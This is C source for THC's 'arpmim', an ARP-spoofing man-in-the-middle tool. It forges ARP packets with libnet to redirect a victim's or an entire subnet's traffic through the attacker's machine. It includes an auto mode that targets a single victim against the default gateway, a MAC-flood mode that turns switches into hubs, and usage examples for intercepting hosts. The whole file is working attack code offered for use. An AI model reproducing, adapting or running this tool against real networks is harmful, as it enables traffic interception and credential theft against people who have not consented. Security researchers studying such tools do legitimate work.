/*
 * ARP MITM attack tool. (c) x 2000
 * Idea from scut's arptool - Requires Libnet 1.00.
 * rewritten & enhanced by skyper/TESO.... 2001
 * Resurrected from the dead by Skyper/THC....2020
 *
 * Changes:
 *	s	: - rewritten
 *		  - macoff
 *		  - ip-list file input/output,
 * 			<ip1>[:<mac1>]
 *			<ip2>[:<mac2>]
 *			...
 *		  - asymmetric arpmim support (usefull for ssl/sshd mim)
 *		  - 1:N and n:N arpmim (experimental)
 *		  - ARP_REQUEST/REPLY (see informationals 001)
 *                  [UPDATE: same techniq works against obsd2.8
 *                  solaris 7+8, hpux10.20, hpux11.00, fbsd4.2, linux 2.2]
 * 
 * Features:
 * - classic mim: redirect data from 1 host to 1 host via your host.
 * - redirect data from n hosts to 1 host via your host with specific ip:mac.
 * - redirect data from N/all hosts to 1 host via your host with just 
 *   1 packet every 10 seconds. We use broadcast mac with unicast 
 *   arp-information in the packet.
 * - redirect communication from n hosts to n hosts via your host
 *   with just n packets (and _not_ n*n as most(all?) existing arpmim tools.
 * 
 * Hints:
 * - dont forgett to enable forwarding:
 *   "echo 1 >/proc/sys/net/ipv4/ip_forward"
 * - dont use NAT/connection tracking while hijaking.
 * - configure your firewall (input, output, forward rules)
 */

#include "common.h"
#include "utils.h"
#include <math.h>
#include <time.h>
#include <libnet.h>

#define OPT_FL_ASYM	0x01
#define OPT_FL_AUTO	0x02
#define OPT_FL_REVASYM	0x04
#define OPT_FL_MACOFF	0x08

struct _ipmac {
	unsigned char mac[6];
	unsigned long ip;
};

struct _opt {
	unsigned long int pwait;
	u_short arpop;
	struct _ipmac trgt;
	int verb;
	uint8_t mymac[6];
	unsigned char flags;
	struct in_addr gw_addr;		/* Default GW address */
	char *ldev;
	unsigned long victim_ip;
  	struct libnet_link_int *link;
	unsigned long int (*initipmac) (void *);
	unsigned long int (*getnextipmac) (void *);
	unsigned long int (*resetipmac) (void *);
	libnet_t *lnctx;
	libnet_ptag_t lnptagArp;
	libnet_ptag_t lnptagEth;
	FILE *flfd;	/* Filelist FD */
} opt;

struct _avlopt {
	int pos;
	int len;
	char **argvlist;
} avl;

/*
 * spread mode ip structure. all ip infos in HBO
 */
struct _srdnfo {
	unsigned long ip_offset;
	unsigned long ip_blklen;
	unsigned long ip_pos;
	unsigned long start_ip;
	unsigned long end_ip;
};

u_long gennext_spreadip(struct _srdnfo *);
int init_spreadset(struct _srdnfo *, u_long, u_long);
int str2ipmac(char *, struct _ipmac *);
void die(int, char *, ...);

int
dummy()
{
	return (0);
}

unsigned long int
init_argvlist(char *argv[])
{
	avl.argvlist = argv;
	avl.len = 0;
	avl.pos = 0;

	if (avl.argvlist == NULL)
		return (-1);

        while (avl.argvlist[avl.len] != NULL)
                avl.len++;
	//DEBUGF("init(): AVL.LEN %d, AVL.POS %d\n", avl.len, avl.pos);

	return (0);
}

unsigned long int
getnext_argvlist(struct _ipmac *ipmac)
{
	//DEBUGF("next(): avl.pos %d\n", avl.pos);
	if (avl.pos >= avl.len)
	{
		//DEBUGF("avl.pos %d > avl.lne %d\n", avl.pos, avl.len);
		return -1;
	}

	str2ipmac(avl.argvlist[avl.pos], ipmac);
	avl.pos++;
	return (0);
}

unsigned long int
reset_argvlist()
{
	if (opt.verb > 1)
		printf("restarting from the beginning.\n");

	avl.pos = 0;
	return (0);
}

unsigned long int
getnext_filelist(struct _ipmac *ipmac)
{
	char buf[128];

	if (fgets(buf, sizeof(buf)-1, opt.flfd) == NULL)
		return (-1);

	str2ipmac(buf, ipmac);
	return (0);
}

unsigned long int
reset_filelist()
{
	if (opt.verb > 1)
		printf("reached eof. restarting filelist\n");

	return (fseek(opt.flfd, 0L, SEEK_SET));
}

unsigned long int
getnext_random(struct _ipmac *ipmac)
{
	static char i = 0;

	if (i == 0)
	{
		srand((int)time(NULL));
		i = 1;
	}

	opt.trgt.ip = rand();
	ipmac->ip = rand();	/* we honestly dont care about the 	*/
				/* first 2 bytes of the mac....		*/
	memcpy(ipmac->mac+2, (char *)&(ipmac->ip), 4);
	memcpy(opt.trgt.mac+2, (char *)&(opt.trgt.ip), 4);
	memcpy(opt.mymac, ipmac->mac, 6);

	return (0);
}

void
init_vars()
{
	opt.pwait = 4000;
	opt.arpop = ARPOP_REPLY;
	opt.flags = 0;
	opt.verb = 0;
	opt.initipmac = (void *) init_argvlist;
	opt.getnextipmac = (void *) getnext_argvlist;
	opt.resetipmac = (void *) reset_argvlist;
	memset(&avl, 0, sizeof avl);
}


/*
 * this is for sure not reentrant.
 * returns mac-string from mac
 * NULL on error
 */
static char *
mac2str(unsigned char m[6])
{
	static char buf[32];

	sprintf(buf, "%2.2x:%2.2x:%2.2x:%2.2x:%2.2x:%2.2x", m[0], m[1], m[2],
							m[3], m[4], m[5]);
	return (buf);
}

/*
 * convert "<ip>:<mac> touple to ipmac struct
 * Set "ff:ff:ff:ff:ff:ff" if no mac is given.
 * return -1 on failure, 0 on success
 */
int
str2ipmac(char *str, struct _ipmac *ipmac)
{
	char *ptr;
	char str2[128];

	if (ipmac == NULL)
		return (-1);
	if (str == NULL)
		return (-1);

	strncpy(str2, str, sizeof(str2)-1);
	str2[sizeof(str2)-1] = '\0';
	if ((ptr = strchr(str2, ':')) != NULL)
	{
		*ptr++ = '\0';
		mac_aton(ptr, ipmac->mac);
	} else {
		memcpy(ipmac->mac, "\xff\xff\xff\xff\xff\xff", 6);
	}

	ipmac->ip = inet_addr(str2);
	
	return (0);
}

void 
usage(int code, char *string)
{
	if (string != NULL)
		fprintf(stderr, "ERROR: %s\n", string);
	fprintf(stderr,
"\n"
"THC ARP Man-in-the-Middle ver "VERSION"\n"
"https://www.thc.org\n"
"\n"
"Usage:\n"
"arpmim [OPTION] <your mac> <targetip:targetmac> <ip1:mac1> ...\n"
"[Tell ip1, ip2, ... ipN that targetip has <your mac> and\n"
" tell targetip that ip1, ip2, ... ipN has <your mac>]\n"
"Normally 'targetip' is the default gw and the IPs following are the hosts\n"
"you like to redirect to your mac/computer\n"
"\n"
"Options:\n"
" -i <device>	: ethernet device [default=auto]\n"
" -l <iprange>	: generate ip-list [73.50.0.0-73.50.31.255]\n"
" -f <file>	: read ip's[/:mac's] from file\n"
" -w <n ms>	: wait n ms between each packet [default=4sec]\n"
" -m		: mac-flood. Overloads the switch and turns it into a hub.\n"
" -r		: use ARPOP_REQUEST [default=ARPOP_REPLY]\n"
" -a		: asymmetric\n"
" -A		: reverse asymmetric\n"
" -v		: verbose output [-vv..vv for more]\n"
" -t <ip>	: AUTO MODE: Redirect target IP<->GW (***NEW 2020***)\n"
"\n"
"Example (AUTO MODE) - For beginners:\n"
"AUTO MODE: Redirect victim=10.0.1.111\n"
"# arpmitm -t 10.0.1.111"
"\n"
"Examples:\n"
"Classic (1:1, gate=10.0.1.254, victim=10.0.1.111):\n"
"# arpmim -v 00:02:13:37:73:50 10.0.1.254:11:11:22:22:33:33 \\\n"
"                              10.0.1.111:44:44:55:55:66:66\n"
"\n"
"Advanced (1:N, gate=10.0.1.254, Use -a or -A (!)):\n"
"# arpmim -A -v 00:02:13:37:73:50 255.255.255.255 10.0.1.254\n"
"[tell *everyone* that 10.0.1.254 has 00:02:13:37:73:50]\n"
"\n"
"Elite (n:N):\n"
"# arpmim -A -v 00:02:13:37:73:50 255.255.255.255 10.0.0.1 10.0.0.2 10.0.0.3 \\\n"
"                                                 10.0.0.4 10.0.0.5 10.0.0.6\n"
"[tell 10.0.0.1,..10.0.0.6 that 10.0.0.1,..10.0.0.6 has 00:02:13:37:73:50]\n");
	exit(code);
}

/*
 * write ip's to fd, one per line.
 * return 0 on success, -1 on error
 */
int
write_iprange(FILE *fd, char *str)
{
	u_long ip;
	char *ptr;
	struct _srdnfo srdnfo;
	char str2[128];

	strncpy(str2, str, sizeof(str2)-1);
	str2[sizeof(str2)-1] = '\0';

	if ((ptr = strchr(str2, '-')) == NULL)
		return (-1);

        *ptr++ = '\0';

	srdnfo.start_ip = ntohl(inet_addr(str2));
	srdnfo.end_ip = ntohl(inet_addr(ptr));
       	if (init_spreadset(&srdnfo, srdnfo.start_ip, srdnfo.end_ip) != 0)
		return (-1);

	while ((ip = gennext_spreadip(&srdnfo)) != -1)
		printf("%s\n", int_ntoa(ip));

	return (0);
}


void
do_opt(int argc, char *argv[])
{
	extern char *optarg;
	extern int optind;
	int c;

	while ((c = getopt (argc, argv, "t:w:i:l:f:mrAavh")) != -1)
	{
		switch (c)
		{
		case 'h':
			usage(0, NULL);
			break;
		case 'r':
			opt.arpop = ARPOP_REQUEST;
			break;
		case 'w':
			opt.pwait = strtoul (optarg, NULL, 10);
			break;
		case 'i':
			opt.ldev = optarg;
			break;
		case 'l':
			if (write_iprange(stdout, optarg) != 0)
				die (EXIT_FAILURE, "iprage? %s", optarg);
			break;
		case 'A':
			opt.flags |= OPT_FL_REVASYM;
			break;
		case 'a':
			opt.flags |= OPT_FL_ASYM;
			break;
		case 'v':
			opt.verb++;
			break;
		case 'f':
			if ((opt.flfd = fopen(optarg, "r")) == NULL)
				die (EXIT_FAILURE, "fopen %s", optarg);

			opt.initipmac = (void *) dummy;
			opt.getnextipmac = (void *) getnext_filelist;
			opt.resetipmac = (void *) reset_filelist;
			break;
		case 'm':
			opt.flags |= OPT_FL_MACOFF;
			opt.initipmac = (void *) dummy;
			opt.getnextipmac = (void *) getnext_random;
			opt.resetipmac = (void *) dummy;
			break;
		case 't':
			opt.flags |= OPT_FL_AUTO;
			opt.victim_ip = inet_addr(optarg);
			break;
		case ':':
			usage(EXIT_FAILURE, "parameter missing");
			break;	/* this should never happen */
		default:
			usage(EXIT_FAILURE, "unknown option");
			break;
		}
	}

	if (opt.flags & OPT_FL_MACOFF)
		return;

	if (opt.flags & OPT_FL_AUTO)
		return;

	if (argv[optind] != NULL)
		mac_aton(argv[optind++], opt.mymac);
	else
		die (EXIT_FAILURE, "you must specifiy your own mac.");

	if (argv[optind] != NULL)
		str2ipmac(argv[optind++], &opt.trgt);
	else
		die (EXIT_FAILURE, "no target given.");

	opt.initipmac(&argv[optind]);

}

void cleanup(int ret)
{
	libnet_destroy(opt.lnctx);
	exit(ret);
}

void
die(int code, char *fmt, ...)
{
	va_list ap;
	char buf[512];
	
	va_start (ap, fmt);
	vsnprintf (buf, sizeof (buf) -1, fmt, ap);
	va_end (ap);
	fprintf(stderr, "ERROR: %s\n", buf);

	cleanup(code);
}
	
/*
 * get next ip in spread-mode
 * return NBO ip or -1 on error or when done
 */
u_long
gennext_spreadip(struct _srdnfo *srdnfo)
{
	u_long pos = srdnfo->ip_pos;

	if ((srdnfo->ip_offset + 1 >= srdnfo->ip_blklen)
		&& (srdnfo->ip_pos > srdnfo->end_ip))
		return (-1);

	if ((srdnfo->ip_pos + srdnfo->ip_blklen > srdnfo->end_ip)
		&& (srdnfo->ip_offset + 1 < srdnfo->ip_blklen))
		srdnfo->ip_pos = srdnfo->start_ip + (++srdnfo->ip_offset);
	else
		srdnfo->ip_pos += srdnfo->ip_blklen;

	return (htonl (pos));
}

/*
 * init spreadset, ip's in HBO
 * return 0 on success, -1 on error
 */
int
init_spreadset(struct _srdnfo *srdnfo, u_long start_ip, u_long end_ip)
{
	if (srdnfo == NULL)
		return (-1);

	if (start_ip >= end_ip)
		return (-1);

	srdnfo->start_ip = start_ip;
	srdnfo->ip_pos = srdnfo->start_ip;
	srdnfo->end_ip = end_ip;
	srdnfo->ip_blklen = (u_long) sqrt ((double)(end_ip - start_ip));
	if (srdnfo->ip_blklen > 100)	/* range is 100^2 in size */
		srdnfo->ip_blklen = 257 + srdnfo->ip_blklen * 0.2;

	srdnfo->ip_offset = 0;

	return (0);
}

/*
 * tell 'dst' that I'M src
 * return 0 on success
 */
int
do_arpmim(uint8_t *mymac, struct _ipmac *src, struct _ipmac *dst)
{
	opt.lnptagArp = libnet_build_arp(ARPHRD_ETHER, ETHERTYPE_IP,
	                 6, 4, opt.arpop,
	                 mymac,
        	         (unsigned char *)&src->ip,
                	 dst->mac,
	                 (unsigned char *)&dst->ip, 
	                 NULL, 0, opt.lnctx, opt.lnptagArp);

	opt.lnptagEth = libnet_build_ethernet(dst->mac,
	                      mymac,
        	              ETHERTYPE_ARP, NULL, 0, opt.lnctx, opt.lnptagEth);

	libnet_write(opt.lnctx);

	return (0);

}
void
print_amitm(struct _ipmac *ipmac0, struct _ipmac *ipmac)
{
	if (opt.verb)
	{
		printf("Hi %s:%s, ", int_ntoa(ipmac->ip),
					mac2str(ipmac->mac));
		printf("%s is at %s\n", int_ntoa(ipmac0->ip),
					 mac2str(opt.mymac));
	}
}


static int
GetRemoteMac(unsigned long ip, unsigned char *mac)
{
	int ret;
	libnet_ptag_t ptag = 0;

	/*
	 * First see if an entry exists already...
	 */
	ret = GetMacFromArpTable(ip, mac);
	if (ret == 0)
		return 0;

	/* Victim's MAC entry does not exist in ARP table. Lets poke it */
	/* Send ARP request for victim's IP */
	ptag = libnet_autobuild_arp(ARPOP_REQUEST,
			opt.mymac,
			(uint8_t *)"\x0\x0\x0\x0",
			(uint8_t *)"\xff\xff\xff\xff\xff\xff", /*opt.mymac, */
			(uint8_t *)&ip,
			opt.lnctx);
	if (ptag <= 0)
		ERREXIT("libnet_build_arp() failed.\n");

	ptag = libnet_build_ethernet((u_int8_t *)"\xff\xff\xff\xff\xff\xff", opt.mymac, ETHERTYPE_ARP, NULL, 0, opt.lnctx, 0);
	if (ptag <= 0)
		ERREXIT("libnet_build_ethernet() failed.\n");

	if (libnet_write(opt.lnctx) == -1)
		ERREXIT("libnet_write() failed.\n");
			
	sleep(1);
	
	ret = GetMacFromArpTable(ip, mac);
	if (ret != 0)
		return -1;

	return 0;
}

int 
main(int argc, char *argv[])
{
	struct _ipmac ipmac;
	char *argz[3];
	char buf[128];

	init_vars();

	do_opt(argc, argv);
	if (opt.initipmac == NULL)
		usage(0, "not enough parameters");

	if (getuid() != 0)
		ERREXIT("Permission denied. Need superuser priviledges\n");

	opt.lnctx = libnet_init(LIBNET_LINK_ADV, opt.ldev, NULL);
	if (opt.lnctx == NULL)
		ERREXIT("Failed to initilize libnet. Permission denied.\n");


	/*
	 * AUTO MODE: Find out GW IP/MAC and Traget MAC
	 */
	if (opt.flags & OPT_FL_AUTO)
	{
		char ldev[IF_NAMESIZE];
		unsigned char mac_gw[6];
		unsigned char mac_victim[6];

		int ret;
		ret = GetDefaultGW(&opt.gw_addr, ldev);
		if (ret != 0)
			ERREXIT("Can't determine default GW\n");
		DEBUGF("Default GW is: %s\n", inet_ntoa(opt.gw_addr));

		ret = GetMyMac(ldev, opt.mymac);
		if (ret != 0)
			ERREXIT("Can't find out my own MAC\n");
		ret = GetMacFromArpTable(opt.gw_addr.s_addr, mac_gw);
		if (ret != 0)
			ERREXIT("Can't find GW's mac addres\n");

		printf("AUTO MODE\n");
		printf("My MAC is %s on %s\n", mac2str(opt.mymac), ldev);
		printf("Default GW is: %s at %s\n", inet_ntoa(opt.gw_addr), mac2str(mac_gw));

#if 1
		ret = GetRemoteMac(opt.victim_ip, mac_victim);
		if (ret != 0)
			ERREXIT("Can't find victim's MAC. Not online? Try ping %s\n", int_ntoa(opt.victim_ip));
#else
		memcpy(mac_victim, "\xde\xad\xbe\xef\xba\xbe", 6);
#endif
		printf("Victim is: %s at %s\n", int_ntoa(opt.victim_ip), mac2str(mac_victim));

		/*
		 * Place info into internal structure so that the old loop can send out arps....
		 */
		snprintf(buf, sizeof buf, "%s:%s", inet_ntoa(opt.gw_addr), mac2str(mac_gw));
		str2ipmac(buf, &opt.trgt);

		argz[0] = buf;
		argz[1] = NULL;
		snprintf(buf, sizeof buf, "%s:%s", int_ntoa(opt.victim_ip), mac2str(mac_victim));
		opt.initipmac(argz);
	}

	while (1)
	{

		if (opt.getnextipmac(&ipmac) == -1)
		{
			if (opt.resetipmac(NULL) != 0)
				die(EXIT_FAILURE, "unable to reset ipmac list");

			if (opt.getnextipmac(&ipmac) == -1)
				ERREXIT("FATAL: No ip's???\n");
		}

		if (!(opt.flags & OPT_FL_REVASYM))
		{
			if (opt.verb)
				print_amitm(&opt.trgt, &ipmac);
			do_arpmim(opt.mymac, &opt.trgt, &ipmac);
		}

		if (!(opt.flags & OPT_FL_ASYM))
		{
			usleep(3000); /* 0.03 seconds */
			if (opt.verb)
				print_amitm(&ipmac, &opt.trgt);
			do_arpmim(opt.mymac, &ipmac, &opt.trgt);
		}

		usleep(opt.pwait * 1000);
	}

	exit(0);
	return 0;
}

